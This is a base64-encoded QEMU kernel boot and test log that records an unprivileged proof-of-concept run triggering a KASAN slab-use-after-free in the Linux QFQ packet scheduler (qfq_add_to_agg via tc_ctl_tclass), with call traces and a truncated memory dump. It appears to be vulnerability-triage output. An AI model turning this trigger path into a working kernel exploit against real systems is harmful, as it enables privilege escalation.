IGthc2FuLmZhdWx0PXBhbmljDQpVbmtub3duIGtlcm5lbCBjb21tYW5kIGxpbmUgcGFyYW1ldGVy
cyAibm9rYXNsciIsIHdpbGwgYmUgcGFzc2VkIHRvIHVzZXIgc3BhY2UuDQpyYW5kb206IGNybmcg
aW5pdCBkb25lDQpwcmludGs6IGxvZyBidWZmZXIgZGF0YSArIG1ldGEgZGF0YTogMTMxMDcyICsg
NDU4NzUyID0gNTg5ODI0IGJ5dGVzDQpEZW50cnkgY2FjaGUgaGFzaCB0YWJsZSBlbnRyaWVzOiAy
NjIxNDQgKG9yZGVyOiA5LCAyMDk3MTUyIGJ5dGVzLCBsaW5lYXIpDQpJbm9kZS1jYWNoZSBoYXNo
IHRhYmxlIGVudHJpZXM6IDEzMTA3MiAob3JkZXI6IDgsIDEwNDg1NzYgYnl0ZXMsIGxpbmVhcikN
CkJ1aWx0IDEgem9uZWxpc3RzLCBtb2JpbGl0eSBncm91cGluZyBvbi4gIFRvdGFsIHBhZ2VzOiA1
MjQxNTgNCm1lbSBhdXRvLWluaXQ6IHN0YWNrOmFsbCh6ZXJvKSwgaGVhcCBhbGxvYzpvZmYsIGhl
YXAgZnJlZTpvZmYNCnN0YWNrZGVwb3Q6IGFsbG9jYXRpbmcgaGFzaCB0YWJsZSB2aWEgYWxsb2Nf
bGFyZ2Vfc3lzdGVtX2hhc2gNCnN0YWNrZGVwb3QgaGFzaCB0YWJsZSBlbnRyaWVzOiAxMDQ4NTc2
IChvcmRlcjogMTIsIDE2Nzc3MjE2IGJ5dGVzLCBsaW5lYXIpDQpzdGFja2RlcG90OiBhbGxvY2F0
aW5nIHNwYWNlIGZvciA4MTkyIHN0YWNrIHBvb2xzIHZpYSBtZW1ibG9jaw0KU0xVQjogSFdhbGln
bj02NCwgT3JkZXI9MC0zLCBNaW5PYmplY3RzPTAsIENQVXM9MiwgTm9kZXM9MQ0KZnRyYWNlOiBh
bGxvY2F0aW5nIDE5ODc2IGVudHJpZXMgaW4gNzggcGFnZXMNCmZ0cmFjZTogYWxsb2NhdGVkIDc4
IHBhZ2VzIHdpdGggNCBncm91cHMNCnJjdTogSGllcmFyY2hpY2FsIFJDVSBpbXBsZW1lbnRhdGlv
bi4NCglUcmFtcG9saW5lIHZhcmlhbnQgb2YgVGFza3MgUkNVIGVuYWJsZWQuDQoJUnVkZSB2YXJp
YW50IG9mIFRhc2tzIFJDVSBlbmFibGVkLg0KCVRyYWNpbmcgdmFyaWFudCBvZiBUYXNrcyBSQ1Ug
ZW5hYmxlZC4NCnJjdTogUkNVIGNhbGN1bGF0ZWQgdmFsdWUgb2Ygc2NoZWR1bGVyLWVubGlzdG1l
bnQgZGVsYXkgaXMgMjUgamlmZmllcy4NClJDVSBUYXNrczogU2V0dGluZyBzaGlmdCB0byAxIGFu
ZCBsaW0gdG8gMSByY3VfdGFza19jYl9hZGp1c3Q9MSByY3VfdGFza19jcHVfaWRzPTIuDQpSQ1Ug
VGFza3MgUnVkZTogU2V0dGluZyBzaGlmdCB0byAxIGFuZCBsaW0gdG8gMSByY3VfdGFza19jYl9h
ZGp1c3Q9MSByY3VfdGFza19jcHVfaWRzPTIuDQpOUl9JUlFTOiA0MzUyLCBucl9pcnFzOiA1Niwg
cHJlYWxsb2NhdGVkIGlycXM6IDE2DQpyY3U6IHNyY3VfaW5pdDogU2V0dGluZyBzcmN1X3N0cnVj
dCBzaXplcyBiYXNlZCBvbiBjb250ZW50aW9uLg0KY2xvY2tzb3VyY2U6IGppZmZpZXM6IG1hc2s6
IDB4ZmZmZmZmZmYgbWF4X2N5Y2xlczogMHhmZmZmZmZmZiwgbWF4X2lkbGVfbnM6IDc2NDUwNDE3
ODUxMDAwMDAgbnMNCkNvbnNvbGU6IGNvbG91ciAqQ0dBIDgweDI1DQpwcmludGs6IGNvbnNvbGUg
W3R0eVMwXSBlbmFibGVkDQpBQ1BJOiBDb3JlIHJldmlzaW9uIDIwMjYwNDA4DQpjbG9ja3NvdXJj
ZTogaHBldDogbWFzazogMHhmZmZmZmZmZiBtYXhfY3ljbGVzOiAweGZmZmZmZmZmLCBtYXhfaWRs
ZV9uczogMTkxMTI2MDQ0NjcgbnMNCkFQSUM6IFN3aXRjaCB0byBzeW1tZXRyaWMgSS9PIG1vZGUg
c2V0dXANCi4uVElNRVI6IHZlY3Rvcj0weDMwIGFwaWMxPTAgcGluMT0yIGFwaWMyPS0xIHBpbjI9
LTENCmNsb2Nrc291cmNlOiB0c2MtZWFybHk6IG1hc2s6IDB4ZmZmZmZmZmZmZmZmZmZmZiBtYXhf
Y3ljbGVzOiAweDFjZDQyYzdhODEzLCBtYXhfaWRsZV9uczogODgxNTkwNTY1OTUxIG5zDQpDYWxp
YnJhdGluZyBkZWxheSBsb29wIChza2lwcGVkKSwgdmFsdWUgY2FsY3VsYXRlZCB1c2luZyB0aW1l
ciBmcmVxdWVuY3kuLiAxOTk5Ljk5IEJvZ29NSVBTIChscGo9Mzk5OTk5NikNCkxhc3QgbGV2ZWwg
aVRMQiBlbnRyaWVzOiA0S0IgMCwgMk1CIDAsIDRNQiAwDQpMYXN0IGxldmVsIGRUTEIgZW50cmll
czogNEtCIDAsIDJNQiAwLCA0TUIgMCwgMUdCIDANCm1pdGlnYXRpb25zOiBFbmFibGVkIGF0dGFj
ayB2ZWN0b3JzOiBTTVQgbWl0aWdhdGlvbnM6IG9mZg0KU3BlY3VsYXRpdmUgU3RvcmUgQnlwYXNz
OiBWdWxuZXJhYmxlDQpTcGVjdHJlIFYyIDogVnVsbmVyYWJsZQ0KU3BlY3RyZSBWMSA6IFZ1bG5l
cmFibGU6IF9fdXNlciBwb2ludGVyIHNhbml0aXphdGlvbiBhbmQgdXNlcmNvcHkgYmFycmllcnMg
b25seTsgbm8gc3dhcGdzIGJhcnJpZXJzDQp4ODYvZnB1OiBTdXBwb3J0aW5nIFhTQVZFIGZlYXR1
cmUgMHgwMDE6ICd4ODcgZmxvYXRpbmcgcG9pbnQgcmVnaXN0ZXJzJw0KeDg2L2ZwdTogU3VwcG9y
dGluZyBYU0FWRSBmZWF0dXJlIDB4MDAyOiAnU1NFIHJlZ2lzdGVycycNCng4Ni9mcHU6IFN1cHBv
cnRpbmcgWFNBVkUgZmVhdHVyZSAweDAwNDogJ0FWWCByZWdpc3RlcnMnDQp4ODYvZnB1OiBTdXBw
b3J0aW5nIFhTQVZFIGZlYXR1cmUgMHgwMDg6ICdNUFggYm91bmRzIHJlZ2lzdGVycycNCng4Ni9m
cHU6IFN1cHBvcnRpbmcgWFNBVkUgZmVhdHVyZSAweDAxMDogJ01QWCBDU1InDQp4ODYvZnB1OiB4
c3RhdGVfb2Zmc2V0WzJdOiAgNTc2LCB4c3RhdGVfc2l6ZXNbMl06ICAyNTYNCng4Ni9mcHU6IHhz
dGF0ZV9vZmZzZXRbM106ICA5NjAsIHhzdGF0ZV9zaXplc1szXTogICA2NA0KeDg2L2ZwdTogeHN0
YXRlX29mZnNldFs0XTogMTAyNCwgeHN0YXRlX3NpemVzWzRdOiAgIDY0DQp4ODYvZnB1OiBFbmFi
bGVkIHhzdGF0ZSBmZWF0dXJlcyAweDFmLCBjb250ZXh0IHNpemUgaXMgMTA4OCBieXRlcywgdXNp
bmcgJ3N0YW5kYXJkJyBmb3JtYXQuDQpwaWRfbWF4OiBkZWZhdWx0OiAzMjc2OCBtaW5pbXVtOiAz
MDENCk1vdW50LWNhY2hlIGhhc2ggdGFibGUgZW50cmllczogNDA5NiAob3JkZXI6IDMsIDMyNzY4
IGJ5dGVzLCBsaW5lYXIpDQpNb3VudHBvaW50LWNhY2hlIGhhc2ggdGFibGUgZW50cmllczogNDA5
NiAob3JkZXI6IDMsIDMyNzY4IGJ5dGVzLCBsaW5lYXIpDQpWRlM6IEZpbmlzaGVkIG1vdW50aW5n
IHJvb3RmcyBvbiBudWxsZnMNCnNtcGJvb3Q6IENQVTA6IEFNRCBRRU1VIFRDRyBDUFUgdmVyc2lv
biAyLjUrIChmYW1pbHk6IDB4NiwgbW9kZWw6IDB4Niwgc3RlcHBpbmc6IDB4MykNClBlcmZvcm1h
bmNlIEV2ZW50czogUE1VIG5vdCBhdmFpbGFibGUgZHVlIHRvIHZpcnR1YWxpemF0aW9uLCB1c2lu
ZyBzb2Z0d2FyZSBldmVudHMgb25seS4NCnNpZ25hbDogbWF4IHNpZ2ZyYW1lIHNpemU6IDE2MTYN
CnJjdTogSGllcmFyY2hpY2FsIFNSQ1UgaW1wbGVtZW50YXRpb24uDQpyY3U6IAlNYXggcGhhc2Ug
bm8tZGVsYXkgaW5zdGFuY2VzIGlzIDEwMDAuDQpzbXA6IEJyaW5naW5nIHVwIHNlY29uZGFyeSBD
UFVzIC4uLg0Kc21wYm9vdDogeDg2OiBCb290aW5nIFNNUCBjb25maWd1cmF0aW9uOg0KLi4uLiBu
b2RlICAjMCwgQ1BVczogICAgICAjMQ0Kc21wOiBCcm91Z2h0IHVwIDEgbm9kZSwgMiBDUFVzDQpz
bXBib290OiBUb3RhbCBvZiAyIHByb2Nlc3NvcnMgYWN0aXZhdGVkICg0MDAxLjQ5IEJvZ29NSVBT
KQ0KTWVtb3J5OiAxNzQyOTg4Sy8yMDk2NjMySyBhdmFpbGFibGUgKDE3NDA0SyBrZXJuZWwgY29k
ZSwgMzAzOUsgcndkYXRhLCAzMjg4SyByb2RhdGEsIDE0MjBLIGluaXQsIDQxNksgYnNzLCAzNDk0
NjhLIHJlc2VydmVkLCAwSyBjbWEtcmVzZXJ2ZWQpDQpkZXZ0bXBmczogaW5pdGlhbGl6ZWQNCnBv
c2l4dGltZXJzIGhhc2ggdGFibGUgZW50cmllczogMTAyNCAob3JkZXI6IDIsIDE2Mzg0IGJ5dGVz
LCBsaW5lYXIpDQpmdXRleCBoYXNoIHRhYmxlIGVudHJpZXM6IDUxMiAoMzI3NjggYnl0ZXMgb24g
MSBOVU1BIG5vZGVzLCB0b3RhbCAzMiBLaUIsIGxpbmVhcikuDQpORVQ6IFJlZ2lzdGVyZWQgUEZf
TkVUTElOSy9QRl9ST1VURSBwcm90b2NvbCBmYW1pbHkNCnRoZXJtYWxfc3lzOiBSZWdpc3RlcmVk
IHRoZXJtYWwgZ292ZXJub3IgJ3N0ZXBfd2lzZScNCmNwdWlkbGU6IHVzaW5nIGdvdmVybm9yIGxh
ZGRlcg0KQUNQSTogQWRkZWQgX09TSShNb2R1bGUgRGV2aWNlKQ0KQUNQSTogQWRkZWQgX09TSShQ
cm9jZXNzb3IgRGV2aWNlKQ0KQUNQSTogQWRkZWQgX09TSShQcm9jZXNzb3IgQWdncmVnYXRvciBE
ZXZpY2UpDQpBQ1BJIEVycm9yOiBBRV9CQURfUEFSQU1FVEVSLCBEdXJpbmcgUmVnaW9uIGluaXRp
YWxpemF0aW9uICgyMDI2MDQwOC90YnhmbG9hZC01MikNCkFDUEk6IFVuYWJsZSB0byBsb2FkIHRo
ZSBTeXN0ZW0gRGVzY3JpcHRpb24gVGFibGVzDQpBQ1BJIEVycm9yOiBDb3VsZCBub3QgcmVtb3Zl
IFNDSSBoYW5kbGVyICgyMDI2MDQwOC9ldm1pc2MtMjUxKQ0KY2xvY2tzb3VyY2U6IFN3aXRjaGVk
IHRvIGNsb2Nrc291cmNlIHRzYy1lYXJseQ0KcG5wOiBQblAgQUNQSTogZGlzYWJsZWQNCmNsb2Nr
c291cmNlOiBhY3BpX3BtOiBtYXNrOiAweGZmZmZmZiBtYXhfY3ljbGVzOiAweGZmZmZmZiwgbWF4
X2lkbGVfbnM6IDIwODU3MDEwMjQgbnMNCk5FVDogUmVnaXN0ZXJlZCBQRl9JTkVUIHByb3RvY29s
IGZhbWlseQ0KSVAgaWRlbnRzIGhhc2ggdGFibGUgZW50cmllczogMzI3NjggKG9yZGVyOiA2LCAy
NjIxNDQgYnl0ZXMsIGxpbmVhcikNCnRjcF9saXN0ZW5fcG9ydGFkZHJfaGFzaCBoYXNoIHRhYmxl
IGVudHJpZXM6IDEwMjQgKG9yZGVyOiAyLCAxNjM4NCBieXRlcywgbGluZWFyKQ0KVGFibGUtcGVy
dHVyYiBoYXNoIHRhYmxlIGVudHJpZXM6IDY1NTM2IChvcmRlcjogNiwgMjYyMTQ0IGJ5dGVzLCBs
aW5lYXIpDQpUQ1AgZXN0YWJsaXNoZWQgaGFzaCB0YWJsZSBlbnRyaWVzOiAxNjM4NCAob3JkZXI6
IDUsIDEzMTA3MiBieXRlcywgbGluZWFyKQ0KVENQIGJpbmQgaGFzaCB0YWJsZSBlbnRyaWVzOiAx
NjM4NCAob3JkZXI6IDcsIDUyNDI4OCBieXRlcywgbGluZWFyKQ0KVENQOiBIYXNoIHRhYmxlcyBj
b25maWd1cmVkIChlc3RhYmxpc2hlZCAxNjM4NCBiaW5kIDE2Mzg0KQ0KVURQIGhhc2ggdGFibGUg
ZW50cmllczogMTAyNCAob3JkZXI6IDQsIDY1NTM2IGJ5dGVzLCBsaW5lYXIpDQpORVQ6IFJlZ2lz
dGVyZWQgUEZfVU5JWC9QRl9MT0NBTCBwcm90b2NvbCBmYW1pbHkNCk5FVDogUmVnaXN0ZXJlZCBQ
Rl9JTkVUNiBwcm90b2NvbCBmYW1pbHkNClNlZ21lbnQgUm91dGluZyB3aXRoIElQdjYNCkluLXNp
dHUgT0FNIChJT0FNKSB3aXRoIElQdjYNClVucGFja2luZyBpbml0cmFtZnMuLi4NCnBsYXRmb3Jt
IHJ0Y19jbW9zOiByZWdpc3RlcmVkIGZhbGxiYWNrIHBsYXRmb3JtIFJUQyBkZXZpY2UNCndvcmtp
bmdzZXQ6IHRpbWVzdGFtcF9iaXRzPTYyIChhbm9uOiA1NykgbWF4X29yZGVyPTE5IGJ1Y2tldF9v
cmRlcj0wIChhbm9uOiAwKQ0KU2VyaWFsOiA4MjUwLzE2NTUwIGRyaXZlciwgNCBwb3J0cywgSVJR
IHNoYXJpbmcgZGlzYWJsZWQNCnNlcmlhbDgyNTA6IHR0eVMwIEkvTzoweDNmOCAoaXJxID0gNCwg
YmFzZV9iYXVkID0gMTE1MjAwKSBpcyBhIDE2NTUwQQ0KaTgwNDI6IFBOUDogTm8gUFMvMiBjb250
cm9sbGVyIGZvdW5kLg0KaTgwNDI6IFByb2JpbmcgcG9ydHMgZGlyZWN0bHkuDQpzZXJpbzogaTgw
NDIgS0JEIHBvcnQgYXQgMHg2MCwweDY0IGlycSAxDQpzZXJpbzogaTgwNDIgQVVYIHBvcnQgYXQg
MHg2MCwweDY0IGlycSAxMg0Kc2l0OiBJUHY2LCBJUHY0IGFuZCBNUExTIG92ZXIgSVB2NCB0dW5u
ZWxpbmcgZHJpdmVyDQppbnB1dDogQVQgVHJhbnNsYXRlZCBTZXQgMiBrZXlib2FyZCBhcyAvZGV2
aWNlcy9wbGF0Zm9ybS9pODA0Mi9zZXJpbzAvaW5wdXQvaW5wdXQwDQpJUEkgc2hvcnRoYW5kIGJy
b2FkY2FzdDogZW5hYmxlZA0KRnJlZWluZyBpbml0cmQgbWVtb3J5OiAxODg4Sw0Kc2NoZWRfY2xv
Y2s6IE1hcmtpbmcgc3RhYmxlICgxNTA2OTE1NDU0LCAxMjQ1NTUzNjApLT4oMTYzMzk2MzE3NSwg
LTI0OTIzNjEpDQpGcmVlaW5nIHVudXNlZCBrZXJuZWwgaW1hZ2UgKGluaXRtZW0pIG1lbW9yeTog
MTQyMEsNCldyaXRlIHByb3RlY3RpbmcgdGhlIGtlcm5lbCByZWFkLW9ubHkgZGF0YTogMjI1Mjhr
DQpGcmVlaW5nIHVudXNlZCBrZXJuZWwgaW1hZ2UgKHRleHQvcm9kYXRhIGdhcCkgbWVtb3J5OiAx
MDI0Sw0KRnJlZWluZyB1bnVzZWQga2VybmVsIGltYWdlIChyb2RhdGEvZGF0YSBnYXApIG1lbW9y
eTogODA4Sw0KUnVuIC9pbml0IGFzIGluaXQgcHJvY2Vzcw0KaW5wdXQ6IEltRXhQUy8yIEdlbmVy
aWMgRXhwbG9yZXIgTW91c2UgYXMgL2RldmljZXMvcGxhdGZvcm0vaTgwNDIvc2VyaW8xL2lucHV0
L2lucHV0Mg0KDQpRRlFfUkVURVNUX0dVRVNUX1NUQVJUDQpMaW51eCBxZnEtbWFpbmxpbmUgNy4z
LjAtcGFja2FnZTEtMTAgIzIgU01QIFBSRUVNUFQgRnJpIE9jdCAyMyAxNToxODo0NSBVVEMgMjAy
NiB4ODZfNjQgR05VL0xpbnV4DQpLZXJuZWwgY29tbWFuZCBsaW5lOiBjb25zb2xlPXR0eVMwIHJk
aW5pdD0vaW5pdCBub2thc2xyIG9vcHM9cGFuaWMgcGFuaWNfb25fd2Fybj0xIHBhbmljPTEga2Fz
YW4uZmF1bHQ9cGFuaWMNClBvQyBTSEEyNTY6IDJhZmM0ODlhMzU1ZWExY2MzM2Y2MDUxMWJhMmMy
YzNkMzZmYWMwMjA1ZmU3MzhlMmQ3NWI3NjUyYTliYzEzZjQgIC9wb2MNCk9ubGluZSBDUFVzOiAw
LTENCkJvdW5kOiB0aHJlZSBhdHRlbXB0cywgMTIwIHNlY29uZHMgZWFjaDsgNTAsMDAwIHJhY2Ug
aXRlcmF0aW9ucyBwZXIgY29tcGxldGVkIG9yaWdpbmFsIFBvQy4NCg0KQVRURU1QVCAxDQpSVU5O
RVIgYWxsb3dlZF9jcHVzOiBjcHUwPTEgY3B1MT0xDQp0c2M6IFJlZmluZWQgVFNDIGNsb2Nrc291
cmNlIGNhbGlicmF0aW9uOiA5OTkuOTkyIE1Ieg0KY2xvY2tzb3VyY2U6IHRzYzogbWFzazogMHhm
ZmZmZmZmZmZmZmZmZmZmIG1heF9jeWNsZXM6IDB4MWNkNDFmMTYzZGUsIG1heF9pZGxlX25zOiA4
ODE1OTA0NTc0NDIgbnMNCmNsb2Nrc291cmNlOiBTd2l0Y2hlZCB0byBjbG9ja3NvdXJjZSB0c2MN
ClBPQ19TVEFSVCB1aWQ9MTAwMCBldWlkPTEwMDAgZ2lkPTEwMDAgY29tbWFuZD0uL3BvYyBsaW1p
dD0xMjBzDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT0NCkJVRzogS0FTQU46IHNsYWItdXNlLWFmdGVyLWZyZWUgaW4gcWZx
X2FkZF90b19hZ2crMHgxZDYvMHgyNjANClJlYWQgb2Ygc2l6ZSA0IGF0IGFkZHIgZmYxMTAwMDAw
MzIxZTQ0MCBieSB0YXNrIHBvYy80OQ0KDQpDUFU6IDAgVUlEOiAxMDAwIFBJRDogNDkgQ29tbTog
cG9jIE5vdCB0YWludGVkIDcuMy4wLXBhY2thZ2UxLTEwICMyIFBSRUVNUFRMQVpZIA0KQ2FsbCBU
cmFjZToNCiA8VEFTSz4NCiBkdW1wX3N0YWNrX2x2bCsweDRmLzB4NzANCiBwcmludF9yZXBvcnQr
MHgxNTkvMHg0YjANCiA/IF9yYXdfc3Bpbl9sb2NrX2lycXNhdmUrMHg3YS8weGMwDQogPyBrYXNh
bl9jb21wbGV0ZV9tb2RlX3JlcG9ydF9pbmZvKzB4NWMvMHgxYjANCiA/IHFmcV9hZGRfdG9fYWdn
KzB4MWQ2LzB4MjYwDQoga2FzYW5fcmVwb3J0KzB4ZGEvMHgxMTANCiA/IHFmcV9hZGRfdG9fYWdn
KzB4MWQ2LzB4MjYwDQogX19hc2FuX3JlcG9ydF9sb2FkNF9ub2Fib3J0KzB4MTQvMHgyMA0KIHFm
cV9hZGRfdG9fYWdnKzB4MWQ2LzB4MjYwDQogPyBxZnFfcm1fZnJvbV9hZ2crMHgxZWUvMHgyYzAN
CiBxZnFfY2hhbmdlX2NsYXNzKzB4NjQ2LzB4MTYyMA0KID8gcWZxX2R1bXBfY2xhc3Nfc3RhdHMr
MHg2MTAvMHg2MTANCiA/IGFyY2hfc3RhY2tfd2FsaysweDkxLzB4YzANCiB0Y19jdGxfdGNsYXNz
KzB4NDhhLzB4MTM4MA0KID8gcWRpc2NfY3JlYXRlKzB4MTI1MC8weDEyNTANCiA/IGthc2FuX3Nh
dmVfc3RhY2srMHg0OS8weDYwDQogPyBfX2thc2FuX2NoZWNrX3dyaXRlKzB4MTQvMHgyMA0KID8g
bXV0ZXhfbG9jaysweDZkLzB4YjANCiA/IF9fbXV0ZXhfbG9ja19zbG93cGF0aCsweDIwLzB4MjAN
CiBydG5ldGxpbmtfcmN2X21zZysweDU0Ny8weGQxMA0KID8gcnRubF9jYWxjaXQuaXNyYS4wKzB4
MmMwLzB4MmMwDQogbmV0bGlua19yY3Zfc2tiKzB4MTMyLzB4MzcwDQogPyBydG5sX2NhbGNpdC5p
c3JhLjArMHgyYzAvMHgyYzANCiA/IG5ldGxpbmtfYWNrKzB4Y2MwLzB4Y2MwDQogPyBfX2FzYW5f
bWVtc2V0KzB4MzkvMHg0MA0KID8gX2NvcHlfZnJvbV9pdGVyKzB4MTZkLzB4MTRkMA0KIHJ0bmV0
bGlua19yY3YrMHgxNS8weDIwDQogbmV0bGlua191bmljYXN0KzB4NjA2LzB4OWYwDQogPyBuZXRs
aW5rX2F0dGFjaHNrYisweDlmMC8weDlmMA0KIG5ldGxpbmtfc2VuZG1zZysweDdiMC8weGVkMA0K
ID8gbmV0bGlua191bmljYXN0KzB4OWYwLzB4OWYwDQogPyBfX2ltcG9ydF9pb3ZlYysweDMzOC8w
eDVlMA0KIF9fX19zeXNfc2VuZG1zZysweDI3Zi8weGE4MA0KID8gX19fX3N5c19zZW5kbXNnKzB4
MjdmLzB4YTgwDQogPyBpbXBvcnRfaW92ZWMrMHhiLzB4MTANCiA/IF9fc29ja19yZWN2X2Ntc2dz
KzB4NTUwLzB4NTUwDQogPyBfX3dha2VfdXArMHg0NS8weDYwDQogX19fc3lzX3NlbmRtc2crMHhl
My8weDE1MA0KID8gY29weV9tc2doZHJfZnJvbV91c2VyKzB4NDMwLzB4NDMwDQogPyBuZXRsaW5r
X2R1bXArMHgxNWMwLzB4MTVjMA0KID8gX19rYXNhbl9jaGVja193cml0ZSsweDE0LzB4MjANCiA/
IGZwdXQrMHgyYi8weDkwDQogX19zeXNfc2VuZG1zZysweDEwMi8weDE4MA0KID8gX19zeXNfc2Vu
ZG1zZ19zb2NrKzB4MjAvMHgyMA0KIF9feDY0X3N5c19zZW5kbXNnKzB4NzcvMHhiMA0KIHg2NF9z
eXNfY2FsbCsweDI3Zi8weGE0MA0KIGRvX3N5c2NhbGxfNjQrMHg1NS8weDJjMA0KIGVudHJ5X1NZ
U0NBTExfNjRfYWZ0ZXJfaHdmcmFtZSsweDRiLzB4NTMNClJJUDogMDAzMzoweDQ0MWViZQ0KQ29k
ZTogMDggMGYgODUgZTUgZTIgZmYgZmYgNDkgODkgZmIgNDggODkgZjAgNDggODkgZDcgNDggODkg
Y2UgNGMgODkgYzIgNGQgODkgY2EgNGMgOGIgNDQgMjQgMDggNGMgOGIgNGMgMjQgMTAgNGMgODkg
NWMgMjQgMDggMGYgMDUgPGMzPiA5MCA0MSA1NyA0MSA1NiA0ZCA4OSBjNiA0MSA1NSA0ZCA4OSBj
ZCA0MSA1NCA1NSA1MyA0OCA4MyBlYyAwOA0KUlNQOiAwMDJiOjAwMDA3ZmZlMGJlYWU5ZjggRUZM
QUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAwMDAyZQ0KUkFYOiBmZmZmZmZmZmZm
ZmZmZmRhIFJCWDogMDAwMDAwMDAzMDM3NTNjMCBSQ1g6IDAwMDAwMDAwMDA0NDFlYmUNClJEWDog
MDAwMDAwMDAwMDAwMDAwMCBSU0k6IDAwMDA3ZmZlMGJlYWVhODAgUkRJOiAwMDAwMDAwMDAwMDAw
MDAzDQpSQlA6IDAwMDA3ZmZlMGJlYjBiMDAgUjA4OiAwMDAwMDAwMDAwMDAwMDAwIFIwOTogMDAw
MDAwMDAwMDAwMDAwMA0KUjEwOiAwMDAwMDAwMDAwMDAwMDAwIFIxMTogMDAwMDAwMDAwMDAwMDI0
NiBSMTI6IDAwMDA3ZmZlMGJlYWVhYzANClIxMzogMDAwMDAwMDAwMDAwMDAwNSBSMTQ6IDAwMDA3
ZmZlMGJlYjFiNDAgUjE1OiAwMDAwN2ZmZTBiZWIxYjNjDQogPC9UQVNLPg0KDQpBbGxvY2F0ZWQg
YnkgdGFzayA1MDoNCiBrYXNhbl9zYXZlX3N0YWNrKzB4MzkvMHg2MA0KIGthc2FuX3NhdmVfdHJh
Y2srMHgxNC8weDMwDQoga2FzYW5fc2F2ZV9hbGxvY19pbmZvKzB4MzcvMHg0MA0KIF9fa2FzYW5f
a21hbGxvYysweDkwLzB4YTANCiBfX2ttYWxsb2NfY2FjaGVfbm9wcm9mKzB4MTQxLzB4MzEwDQog
cWZxX2VucXVldWUrMHhhMzcvMHgxM2EwDQogZGV2X3FkaXNjX2VucXVldWUrMHg0Mi8weDFhMA0K
IF9fZGV2X3F1ZXVlX3htaXQrMHgxYjhjLzB4MzFlMA0KIGlwX2ZpbmlzaF9vdXRwdXQyKzB4ZGQ5
LzB4MWZjMA0KIF9faXBfZmluaXNoX291dHB1dCsweDI3Ny8weDlhMA0KIGlwX291dHB1dCsweGMx
LzB4MTUwDQogaXBfbG9jYWxfb3V0KzB4Mjc1LzB4MzIwDQogaXBfc2VuZF9za2IrMHgzYi8weGIw
DQogdWRwX3NlbmRfc2tiKzB4NzYyLzB4ZDAwDQogdWRwX3NlbmRtc2crMHgxMjU3LzB4MjM1MA0K
IGluZXRfc2VuZG1zZysweDhiLzB4YzANCiBfX3N5c19zZW5kdG8rMHgyOTYvMHg1MDANCiBfX3g2
NF9zeXNfc2VuZHRvKzB4ZTAvMHgxYTANCiB4NjRfc3lzX2NhbGwrMHgyOGQvMHhhNDANCiBkb19z
eXNjYWxsXzY0KzB4NTUvMHgyYzANCiBlbnRyeV9TWVNDQUxMXzY0X2FmdGVyX2h3ZnJhbWUrMHg0
Yi8weDUzDQoNCkZyZWVkIGJ5IHRhc2sgNDk6DQoga2FzYW5fc2F2ZV9zdGFjaysweDM5LzB4NjAN
CiBrYXNhbl9zYXZlX3RyYWNrKzB4MTQvMHgzMA0KIGthc2FuX3NhdmVfZnJlZV9pbmZvKzB4M2Iv
MHg1MA0KIF9fa2FzYW5fc2xhYl9mcmVlKzB4NDAvMHg2MA0KIGtmcmVlKzB4ZWQvMHgzODANCiBx
ZnFfcm1fZnJvbV9hZ2crMHgxZWUvMHgyYzANCiBxZnFfY2hhbmdlX2NsYXNzKzB4NjM4LzB4MTYy
MA0KIHRjX2N0bF90Y2xhc3MrMHg0OGEvMHgxMzgwDQogcnRuZXRsaW5rX3Jjdl9tc2crMHg1NDcv
MHhkMTANCiBuZXRsaW5rX3Jjdl9za2IrMHgxMzIvMHgzNzANCiBydG5ldGxpbmtfcmN2KzB4MTUv
MHgyMA0KIG5ldGxpbmtfdW5pY2FzdCsweDYwNi8weDlmMA0KIG5ldGxpbmtfc2VuZG1zZysweDdi
MC8weGVkMA0KIF9fX19zeXNfc2VuZG1zZysweDI3Zi8weGE4MA0KIF9fX3N5c19zZW5kbXNnKzB4
ZTMvMHgxNTANCiBfX3N5c19zZW5kbXNnKzB4MTAyLzB4MTgwDQogX194NjRfc3lzX3NlbmRtc2cr
MHg3Ny8weGIwDQogeDY0X3N5c19jYWxsKzB4MjdmLzB4YTQwDQogZG9fc3lzY2FsbF82NCsweDU1
LzB4MmMwDQogZW50cnlfU1lTQ0FMTF82NF9hZnRlcl9od2ZyYW1lKzB4NGIvMHg1Mw0KDQpUaGUg
YnVnZ3kgYWRkcmVzcyBiZWxvbmdzIHRvIHRoZSBvYmplY3QgYXQgZmYxMTAwMDAwMzIxZTQwMA0K
IHdoaWNoIGJlbG9uZ3MgdG8gdGhlIGNhY2hlIGttYWxsb2MtMTI4IG9mIHNpemUgMTI4DQpUaGUg
YnVnZ3kgYWRkcmVzcyBpcyBsb2NhdGVkIDY0IGJ5dGVzIGluc2lkZSBvZg0KIGZyZWVkIDEyOC1i
eXRlIHJlZ2lvbiBbZmYxMTAwMDAwMzIxZTQwMCwgZmYxMTAwMDAwMzIxZTQ4MCkNCg0KVGhlIGJ1
Z2d5IGFkZHJlc3MgYmVsb25ncyB0byB0aGUgcGh5c2ljYWwgcGFnZToNCnBhZ2U6IHJlZmNvdW50
OjAgbWFwY291bnQ6MCBtYXBwaW5nOjAwMDAwMDAwMDAwMDAwMDAgaW5kZXg6MHgwIHBmbjoweDMy
MWUNCmZsYWdzOiAweDAoem9uZT0wKQ0KcGFnZV90eXBlOiBmNShzbGFiKQ0KcmF3OiAwMDAwMDAw
MDAwMDAwMDAwIGZmMTEwMDAwMDAxMzNhMDAgZGVhZDAwMDAwMDAwMDEyMiAwMDAwMDAwMDAwMDAw
MDAwDQpyYXc6IDAwMDAwMDAwMDAwMDAwMDAgMDAwMDAwMDAwMDEwMDAxMCAwMDAwMDAwMGY1MDAw
MDAwIDAwMDAwMDAwMDAwMDAwMDANCnBhZ2UgZHVtcGVkIGJlY2F1c2U6IGthc2FuOiBiYWQgYWNj
ZXNzIGRldGVjdGVkDQoNCk1lbW9yeSBzdGF0ZSBhcm91bmQgdGhlIGJ1Z2d5IGFkZHJlc3M6DQog
ZmYxMTAwMDAwMzIxZTMwMDogZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMgZmMg
ZmMgZmMgZmMNCiBmZjExMDAwMDAzMjFlMzgwOiBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBmYyBm
YyBmYyBmYyBmYyBmYyBmYyBmYw0KPmZmMTEwMDAwMDMyMWU0MDA6IGZhIGZiIGZiIGZiIGZiIGZi
